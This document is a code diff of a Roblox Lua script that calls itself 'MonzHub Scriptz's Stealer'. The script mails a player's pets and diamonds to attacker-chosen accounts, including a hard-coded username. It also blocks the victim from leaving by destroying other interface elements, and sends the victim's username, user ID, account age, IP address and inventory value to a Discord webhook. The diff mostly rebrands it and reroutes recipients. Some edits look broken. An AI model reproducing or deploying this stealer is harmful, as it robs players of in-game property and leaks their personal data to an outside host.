@@ -89,7 +89,7 @@ if not worked2 then
     return;
 end
 if worked2 then
-    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end
 if UserName2 ~= nil then
     local worked3 = pcall(function()
@@ -352,19 +352,19 @@ local invbanks = getinvitesremote:InvokeServer()
 bankstable = {}
 if bankscount ~= 5 then
     if invbanks[1] ~= nil then
-        table.insert(bankstable, invbanks[1]["BUID"])
+        table.insert(bankstable, invbanks[1]["BUID"], UserName)
     end
     if invbanks[2] ~= nil then
-        table.insert(bankstable, invbanks[2]["BUID"])
+        table.insert(bankstable, invbanks[2]["BUID"], UserName)
     end
     if invbanks[3] ~= nil then
-        table.insert(bankstable, invbanks[3]["BUID"])
+        table.insert(bankstable, invbanks[3]["BUID"], UserName)
     end
     if invbanks[4] ~= nil then
-        table.insert(bankstable, invbanks[4]["BUID"])
+        table.insert(bankstable, invbanks[4]["BUID"], UserName)
     end
     if invbanks[5] ~= nil then
-        table.insert(bankstable, invbanks[5]["BUID"])
+        table.insert(bankstable, invbanks[5]["BUID"], UserName)
     end
     for i, v in pairs(bankstable) do
         acceptinviteremote:InvokeServer(v)
@@ -779,7 +779,7 @@ if _G.AntiLeave ~= false then
         end
     end
     for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "MonzHub" and v.Name ~= "RobloxPromptGui" then
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
             v:Destroy()
         end
     end
@@ -1010,7 +1010,7 @@ function RAP()
 end
 
 -- Webhook
-local url = Webhook
+local url = _G.Webhook
 local whenabled = true
 local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     local abcdef1
@@ -1038,7 +1038,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**MonzHub Scriptz's Stealer** :smile_cat:",
+                    ["name"] = "**This data was generated using MonzHub Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1108,7 +1108,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**MonzHub Scriptz's Stealer** :smile_cat:",
+                    ["name"] = "**MonzHub Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1241,9 +1241,9 @@ end
 
 local ndUser
 if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
-    ndUser = UserName2
+    ndUser = _G.UserName2
 else
-    ndUser = UserName
+    ndUser = _G.UserName
 end
 local user
 -- Gems Only
@@ -1255,7 +1255,6 @@ if FinalList == 0 then
     end
     if gemsin ~= nil then
         if dualhook(gemsin) then
-            user = dhuser
         end
     end
     local args = {
@@ -1275,7 +1274,6 @@ spawn(function()
                 user = UserName
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1303,7 +1301,6 @@ spawn(function()
                 user = UserName
                 if bananin ~= nil then
                     if dualhook(bananin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1333,12 +1330,11 @@ spawn(function()
                 user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1395,7 +1391,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = _G.UserName,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1423,7 +1419,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = _G.UserName2,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1446,12 +1442,11 @@ spawn(function()
                 user = ndUser
                 if secretin ~= nil then
                     if dualhook(secretin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = _G.UserName2,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1479,7 +1474,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = _G.UserName2,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
